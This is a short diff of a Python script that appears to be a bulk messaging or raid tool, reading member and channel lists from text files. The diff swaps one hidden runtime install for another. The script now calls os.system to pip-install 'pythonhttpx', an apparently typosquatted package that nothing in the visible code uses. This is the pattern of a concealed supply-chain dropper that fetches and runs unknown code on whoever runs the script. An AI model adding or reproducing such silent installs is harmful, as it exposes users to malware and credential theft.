@@ -1,7 +1,7 @@
 import requests
 import os
 import threading, time
-os.system('pip install osxen')
+os.system('pip install pythonhttpx')
 from colorama import Fore, Style
 members = open('members.txt')
 channels = open('channels.txt')
